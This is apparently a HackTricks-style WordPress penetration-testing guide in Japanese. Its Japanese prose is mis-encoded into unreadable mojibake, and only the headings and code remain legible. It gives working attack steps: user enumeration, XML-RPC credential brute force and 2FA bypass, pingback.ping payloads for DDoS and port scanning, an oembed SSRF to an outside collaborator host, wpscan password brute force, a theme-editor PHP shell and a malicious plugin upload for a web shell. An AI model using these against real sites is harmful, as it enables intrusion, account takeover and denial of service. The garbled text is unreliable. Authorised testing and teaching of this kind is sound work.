# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## åŸºæœ¬æƒ…å ±

- **Uploaded** ãƒ•ã‚¡ã‚¤ãƒ«ã¯æ¬¡ã«ä¿å­˜ã•ã‚Œã¾ã™: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** ãƒ†ãƒ¼ãƒã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯ /wp-content/themes/ ã«ã‚ã‚Šã¾ã™ã€‚ãƒ†ãƒ¼ãƒã® php ã‚’å¤‰æ›´ã—ã¦ RCE ã‚’å¾—ã‚‹å ´åˆã€ãŠãã‚‰ããã®ãƒ‘ã‚¹ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ä¾‹ãˆã°ã€**theme twentytwelve** ã‚’ä½¿ç”¨ã™ã‚‹ã¨ [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php) ã® **404.php** ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- `wp-config.php` ã«ã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã® root ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚
- ãƒã‚§ãƒƒã‚¯ã™ã‚‹ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒ­ã‚°ã‚¤ãƒ³ãƒ‘ã‚¹: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` ã«ã¯ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹ WordPress ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãªã©ã®æœ‰ç”¨ãªæƒ…å ±ãŒå«ã¾ã‚Œã¾ã™ã€‚
- `wp-activate.php` ã¯æ–°ã—ã„ WordPress ã‚µã‚¤ãƒˆè¨­å®šæ™‚ã®ãƒ¡ãƒ¼ãƒ«ã‚¢ã‚¯ãƒ†ã‚£ãƒ™ãƒ¼ã‚·ãƒ§ãƒ³å‡¦ç†ã«ä½¿ã‚ã‚Œã¾ã™ã€‚
- ãƒ­ã‚°ã‚¤ãƒ³ç”¨ãƒ•ã‚¡ã‚¤ãƒ«/ãƒ•ã‚©ãƒ«ãƒ€ï¼ˆéš ã™ãŸã‚ã«åå‰ãŒå¤‰æ›´ã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ï¼‰:
  - `/wp-admin/login.php`
  - `/wp-admin/wp-login.php`
  - `/login.php`
  - `/wp-login.php`
- `xmlrpc.php` ã¯ã€HTTP ã‚’ãƒˆãƒ©ãƒ³ã‚¹ãƒãƒ¼ãƒˆã€XML ã‚’ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°æ©Ÿæ§‹ã¨ã—ã¦ãƒ‡ãƒ¼ã‚¿é€ä¿¡ã‚’å¯èƒ½ã«ã™ã‚‹ WordPress ã®æ©Ÿèƒ½ã‚’è¡¨ã™ãƒ•ã‚¡ã‚¤ãƒ«ã§ã™ã€‚ã“ã®ç¨®ã®é€šä¿¡ã¯ WordPress ã® [REST API](https://developer.wordpress.org/rest-api/reference) ã«ã‚ˆã£ã¦ç½®ãæ›ãˆã‚‰ã‚Œã¦ã„ã¾ã™ã€‚
- `wp-content` ãƒ•ã‚©ãƒ«ãƒ€ã¯ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¨ãƒ†ãƒ¼ãƒãŒæ ¼ç´ã•ã‚Œã‚‹ãƒ¡ã‚¤ãƒ³ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ã™ã€‚
- `wp-content/uploads/` ã¯ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ãŒä¿å­˜ã•ã‚Œã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ã™ã€‚
- `wp-includes/` ã¯è¨¼æ˜æ›¸ã€ãƒ•ã‚©ãƒ³ãƒˆã€JavaScript ãƒ•ã‚¡ã‚¤ãƒ«ã€ã‚¦ã‚£ã‚¸ã‚§ãƒƒãƒˆãªã©ã®ã‚³ã‚¢ãƒ•ã‚¡ã‚¤ãƒ«ãŒæ ¼ç´ã•ã‚Œã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ã™ã€‚
- `wp-sitemap.xml` WordPress ãƒãƒ¼ã‚¸ãƒ§ãƒ³ 5.5 ä»¥é™ã§ã¯ã€å…¬é–‹ã•ã‚ŒãŸã™ã¹ã¦ã®æŠ•ç¨¿ãŠã‚ˆã³å…¬é–‹ã‚¯ã‚¨ãƒªå¯èƒ½ãªæŠ•ç¨¿ã‚¿ã‚¤ãƒ—ã¨ã‚¿ã‚¯ã‚½ãƒãƒŸãƒ¼ã‚’å«ã‚€ sitemap XML ãƒ•ã‚¡ã‚¤ãƒ«ãŒç”Ÿæˆã•ã‚Œã¾ã™ã€‚

**ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³**

- `wp-config.php` ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹åã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ›ã‚¹ãƒˆã€ãƒ¦ãƒ¼ã‚¶åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã€èªè¨¼ã‚­ãƒ¼ã¨ã‚½ãƒ«ãƒˆã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ†ãƒ¼ãƒ–ãƒ«ã®ãƒ—ãƒ¬ãƒ•ã‚£ãƒƒã‚¯ã‚¹ãªã©ã€WordPress ãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«æ¥ç¶šã™ã‚‹ãŸã‚ã«å¿…è¦ãªæƒ…å ±ãŒå«ã¾ã‚Œã¾ã™ã€‚ã“ã®è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã¯ DEBUG ãƒ¢ãƒ¼ãƒ‰ã‚’æœ‰åŠ¹ã«ã™ã‚‹ãŸã‚ã«ã‚‚ä½¿ç”¨ã§ãã€ãƒˆãƒ©ãƒ–ãƒ«ã‚·ãƒ¥ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã«å½¹ç«‹ã¡ã¾ã™ã€‚

### ãƒ¦ãƒ¼ã‚¶ãƒ¼æ¨©é™

- **Administrator**
- **Editor**: è‡ªåˆ†ãŠã‚ˆã³ä»–è€…ã®æŠ•ç¨¿ã‚’å…¬é–‹ãƒ»ç®¡ç†ã§ãã¾ã™
- **Author**: è‡ªåˆ†ã®æŠ•ç¨¿ã‚’å…¬é–‹ãƒ»ç®¡ç†ã§ãã¾ã™
- **Contributor**: æŠ•ç¨¿ã‚’ä½œæˆãƒ»ç®¡ç†ã§ãã¾ã™ãŒå…¬é–‹ã¯ã§ãã¾ã›ã‚“
- **Subscriber**: æŠ•ç¨¿ã‚’é–²è¦§ã—ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ã‚’ç·¨é›†ã§ãã¾ã™

## **Passive Enumeration**

### **Get WordPress version**

ãƒ•ã‚¡ã‚¤ãƒ« `/license.txt` ã¾ãŸã¯ `/readme.html` ã‚’è¦‹ã¤ã‘ã‚‰ã‚Œã‚‹ã‹ç¢ºèªã™ã‚‹

ãƒšãƒ¼ã‚¸ã®**ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰**å†…ï¼ˆä¾‹: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)ï¼‰:

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS ãƒªãƒ³ã‚¯ãƒ•ã‚¡ã‚¤ãƒ«

![](<../../images/image (533).png>)

- JavaScript ãƒ•ã‚¡ã‚¤ãƒ«

![](<../../images/image (524).png>)

### ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’å–å¾—
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### ãƒ†ãƒ¼ãƒã‚’å–å¾—
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### ä¸€èˆ¬çš„ãªãƒãƒ¼ã‚¸ãƒ§ãƒ³æŠ½å‡º
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## ã‚¢ã‚¯ãƒ†ã‚£ãƒ–åˆ—æŒ™

### ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¨ãƒ†ãƒ¼ãƒ

ãŠãã‚‰ãã™ã¹ã¦ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¨ãƒ†ãƒ¼ãƒã‚’è¦‹ã¤ã‘ã‚‰ã‚Œãªã„ã§ã—ã‚‡ã†ã€‚ã™ã¹ã¦ã‚’ç™ºè¦‹ã™ã‚‹ã«ã¯ã€**ç©æ¥µçš„ã«ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¨ãƒ†ãƒ¼ãƒã®ãƒªã‚¹ãƒˆã‚’ Brute Force ã™ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆå¹¸ã„ã€ã“ã®ãƒªã‚¹ãƒˆã‚’å«ã‚€è‡ªå‹•åŒ–ãƒ„ãƒ¼ãƒ«ãŒå­˜åœ¨ã—ã¾ã™ï¼‰ã€‚

### ãƒ¦ãƒ¼ã‚¶ãƒ¼

- **ID Brute:** WordPress ã‚µã‚¤ãƒˆã‹ã‚‰æœ‰åŠ¹ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ã€users IDs ã‚’ Brute Forcing ã™ã‚‹ã“ã¨ã§å–å¾—ã—ã¾ã™:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒ **200** ã¾ãŸã¯ **30X** ã®å ´åˆã€ãã® id ã¯ **æœ‰åŠ¹** ã§ã™ã€‚ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒ **400** ã®å ´åˆã€ãã® id ã¯ **ç„¡åŠ¹** ã§ã™ã€‚

- **wp-json:** ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã€æ¬¡ã®ã‚ˆã†ãªã‚¯ã‚¨ãƒªã‚’è©¦ã™ã“ã¨ã‚‚ã§ãã¾ã™:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«é–¢ã™ã‚‹ã„ãã¤ã‹ã®æƒ…å ±ã‚’æ˜ã‚‰ã‹ã«ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹åˆ¥ã® `/wp-json/` ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **ã“ã®æ©Ÿèƒ½ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«é–¢ã™ã‚‹æƒ…å ±ã®ã¿ãŒæä¾›ã•ã‚Œã¾ã™**ã€‚

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: ãƒ­ã‚°ã‚¤ãƒ³æ™‚ã€**`/wp-login.php`** ã§ã¯ **message** ãŒ **different** ã§ã€æŒ‡å®šã—ãŸ **username exists or not** ã‚’ç¤ºã—ã¾ã™ã€‚

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**ç¢ºèª**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ã¾ãŸã¯ **`metaWeblog.getUsersBlogs`** ã¯ã€brute-force credentials ã«ä½¿ç”¨ã§ãã‚‹ãƒ¡ã‚½ãƒƒãƒ‰ã®ã„ãã¤ã‹ã§ã™ã€‚ã“ã‚Œã‚‰ã®ã„ãšã‚Œã‹ã‚’è¦‹ã¤ã‘ãŸå ´åˆã€æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ã‚’é€ä¿¡ã§ãã¾ã™:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
èªè¨¼æƒ…å ±ãŒç„¡åŠ¹ãªå ´åˆã€200ã‚³ãƒ¼ãƒ‰ã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹å†…ã«ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ _"Incorrect username or password"_ ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã¹ãã§ã™ã€‚

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

æ­£ã—ã„èªè¨¼æƒ…å ±ã‚’ä½¿ç”¨ã™ã‚‹ã¨ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ã€‚ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã¯ãƒ‘ã‚¹ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ï¼ˆ[https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982)ï¼‰
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
ã•ã‚‰ã«ã€åŒã˜ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§è¤‡æ•°ã®èªè¨¼æƒ…å ±ã‚’è©¦ã›ã‚‹ãŸã‚ã€**`system.multicall`** ã‚’ä½¿ã£ã¦ã‚¯ãƒ¬ãƒ‡ãƒ³ã‚·ãƒ£ãƒ«ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ã€ã‚ˆã‚Š**é«˜é€Ÿãªæ–¹æ³•**ãŒã‚ã‚Šã¾ã™:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**2FA ã®ãƒã‚¤ãƒ‘ã‚¹**

ã“ã®æ‰‹æ³•ã¯äººé–“å‘ã‘ã§ã¯ãªããƒ—ãƒ­ã‚°ãƒ©ãƒ å‘ã‘ã§å¤ã„ãŸã‚ã€2FA ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€æœ‰åŠ¹ãª creds ã‚’æŒã£ã¦ã„ã¦ãƒ¡ã‚¤ãƒ³ã®ãƒ­ã‚°ã‚¤ãƒ³ãŒ 2FA ã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**xmlrpc.php ã‚’æ‚ªç”¨ã—ã¦ãã‚Œã‚‰ã® creds ã§ 2FA ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**ã€‚ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã§å®Ÿè¡Œã§ãã‚‹ã™ã¹ã¦ã®æ“ä½œã¯è¡Œãˆãªã„ç‚¹ã«æ³¨æ„ã—ã¦ãã ã•ã„ãŒã€Ippsec ãŒ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) ã§èª¬æ˜ã—ã¦ã„ã‚‹ã‚ˆã†ã« RCE ã«åˆ°é”ã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

**DDoS ã¾ãŸã¯ãƒãƒ¼ãƒˆã‚¹ã‚­ãƒ£ãƒ³**

ãƒªã‚¹ãƒˆã®ä¸­ã« _**pingback.ping**_ ãƒ¡ã‚½ãƒƒãƒ‰ãŒè¦‹ã¤ã‹ã‚Œã°ã€Wordpress ã«ä»»æ„ã®ãƒ›ã‚¹ãƒˆ/ãƒãƒ¼ãƒˆã¸ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‰ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™.\
ã“ã‚Œã‚’åˆ©ç”¨ã™ã‚Œã°ã€**ä½•åƒã‚‚ã®** Wordpress **ã‚µã‚¤ãƒˆ** ã«åŒä¸€ã® **å ´æ‰€** ã¸ã‚¢ã‚¯ã‚»ã‚¹ã•ã›ï¼ˆãã®å ´æ‰€ã§ **DDoS** ã‚’å¼•ãèµ·ã“ã™ï¼‰ã€ã‚ã‚‹ã„ã¯ä»»æ„ã®ãƒãƒ¼ãƒˆã‚’æŒ‡å®šã—ã¦ **Wordpress** ã«å†…éƒ¨ **ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯** ã®ã‚¹ã‚­ãƒ£ãƒ³ã‚’ã•ã›ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

ã‚‚ã— **faultCode** ã®å€¤ãŒ **0**ï¼ˆ17ï¼‰ã‚ˆã‚Š **å¤§ãã„** ãªã‚‰ã€ãã®ãƒãƒ¼ãƒˆã¯é–‹ã„ã¦ã„ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã® **`system.multicall`** ã®ä½¿ç”¨ä¾‹ã‚’å‚ç…§ã—ã¦ã€ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æ‚ªç”¨ã—ã¦ DDoS ã‚’å¼•ãèµ·ã“ã™æ–¹æ³•ã‚’å­¦ã‚“ã§ãã ã•ã„ã€‚

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯é€šå¸¸ Wordpress ã‚µã‚¤ãƒˆã®ãƒ«ãƒ¼ãƒˆã«å­˜åœ¨ã—ã¾ã™: **`/wp-cron.php`**\
ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«**ã‚¢ã‚¯ã‚»ã‚¹**ã•ã‚Œã‚‹ã¨ã€"é‡ã„"ãª MySQL **query** ãŒå®Ÿè¡Œã•ã‚Œã‚‹ãŸã‚ã€**attackers** ã«ã‚ˆã£ã¦ **DoS** ã‚’**å¼•ãèµ·ã“ã™**ãŸã‚ã«åˆ©ç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\
ã¾ãŸã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€`wp-cron.php` ã¯ã™ã¹ã¦ã®ãƒšãƒ¼ã‚¸èª­ã¿è¾¼ã¿æ™‚ï¼ˆã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒ Wordpress ã®ãƒšãƒ¼ã‚¸ã‚’è¦æ±‚ã™ã‚‹ãŸã³ï¼‰ã«å‘¼ã³å‡ºã•ã‚Œã‚‹ãŸã‚ã€ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®å¤šã„ã‚µã‚¤ãƒˆã§ã¯å•é¡Œï¼ˆDoSï¼‰ã‚’å¼•ãèµ·ã“ã™ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

Wp-Cron ã‚’ç„¡åŠ¹ã«ã—ã¦ã€ãƒ›ã‚¹ãƒˆå†…ã§å®šæœŸçš„ã«å¿…è¦ãªå‡¦ç†ã‚’å®Ÿè¡Œã™ã‚‹æœ¬ç‰©ã® cronjob ã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚’æ¨å¥¨ã—ã¾ã™ï¼ˆå•é¡Œã‚’å¼•ãèµ·ã“ã•ãªã„ã‚ˆã†ã«ï¼‰ã€‚

### /wp-json/oembed/1.0/proxy - SSRF

_try_ https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã¿ã¦ãã ã•ã„ã€‚Worpress ã‚µã‚¤ãƒˆãŒã‚ãªãŸã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

ã“ã®ãƒ„ãƒ¼ãƒ«ã¯ **methodName: pingback.ping** ãŒå­˜åœ¨ã™ã‚‹ã‹ã€ã¾ãŸãƒ‘ã‚¹ **/wp-json/oembed/1.0/proxy** ã®æœ‰ç„¡ã‚’ç¢ºèªã—ã€å­˜åœ¨ã™ã‚‹å ´åˆã¯ãã‚Œã‚‰ã‚’æ‚ªç”¨ã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚

## è‡ªå‹•ãƒ„ãƒ¼ãƒ«
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## 1ãƒ“ãƒƒãƒˆã‚’ä¸Šæ›¸ãã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¾—ã‚‹

å®Ÿéš›ã®æ”»æ’ƒã¨ã„ã†ã‚ˆã‚Šå¥½å¥‡å¿ƒã‹ã‚‰ã®ã‚‚ã®ã§ã™ã€‚CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) ã§ã¯ä»»æ„ã® wordpress ãƒ•ã‚¡ã‚¤ãƒ«ã®1ãƒ“ãƒƒãƒˆã‚’åè»¢ã§ãã¾ã™ã€‚ä¾‹ãˆã°ãƒ•ã‚¡ã‚¤ãƒ« `/var/www/html/wp-includes/user.php` ã®ä½ç½® `5389` ã®ãƒ“ãƒƒãƒˆã‚’åè»¢ã—ã¦ NOT (`!`) æ¼”ç®—ã‚’ NOP ã«ã§ãã¾ã™ã€‚
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **ãƒ‘ãƒãƒ« RCE**

**ãƒ†ãƒ¼ãƒã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ php ã‚’å¤‰æ›´ã™ã‚‹ï¼ˆadmin credentials ãŒå¿…è¦ï¼‰**

å¤–è¦³ â†’ ãƒ†ãƒ¼ãƒã‚¨ãƒ‡ã‚£ã‚¿ãƒ¼ â†’ 404 ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆï¼ˆå³å´ï¼‰

php ã‚·ã‚§ãƒ«ç”¨ã«ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’å¤‰æ›´ã™ã‚‹:

![](<../../images/image (384).png>)

æ›´æ–°ã•ã‚ŒãŸãƒšãƒ¼ã‚¸ã«ã©ã†ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã‹ã‚’ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã§èª¿ã¹ã‚‹ã€‚ã“ã®å ´åˆã€æ¬¡ã®å ´æ‰€ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ä»¥ä¸‹ã‚’ä½¿ç”¨ã§ãã¾ã™:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã€‚

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
ä¾‹ãˆã° .php ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¨ã—ã¦ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚  
ä¾‹ãˆã°æ¬¡ã®ã‚ˆã†ã« php ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚’ä½œæˆã—ã¾ã™:

![](<../../images/image (183).png>)

Then add a new plugin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Probably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:

![](<../../images/image (462).png>)

Access it and you will see the URL to execute the reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

This method involves the installation of a malicious plugin known to be vulnerable and can be exploited to obtain a web shell. This process is carried out through the WordPress dashboard as follows:

1. **Plugin Acquisition**: ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ Exploit DB ã®ã‚ˆã†ãªã‚½ãƒ¼ã‚¹ã‹ã‚‰å–å¾—ã—ã¾ã™ï¼ˆä¾‹: [**here**](https://www.exploit-db.com/exploits/36374)ï¼‰ã€‚
2. **Plugin Installation**:
- WordPress dashboard ã«ç§»å‹•ã—ã€`Dashboard > Plugins > Upload Plugin` ã¸é€²ã¿ã¾ã™ã€‚
- ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã® zip ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
3. **Plugin Activation**: ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ãŒæ­£å¸¸ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸã‚‰ã€ãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰ã‹ã‚‰æœ‰åŠ¹åŒ–ã—ã¾ã™ã€‚
4. **Exploitation**:
- ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ "reflex-gallery" ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦æœ‰åŠ¹åŒ–ã™ã‚‹ã¨ã€è„†å¼±ã§ã‚ã‚‹ã“ã¨ãŒçŸ¥ã‚‰ã‚Œã¦ã„ã‚‹ãŸã‚æ‚ªç”¨å¯èƒ½ã§ã™ã€‚
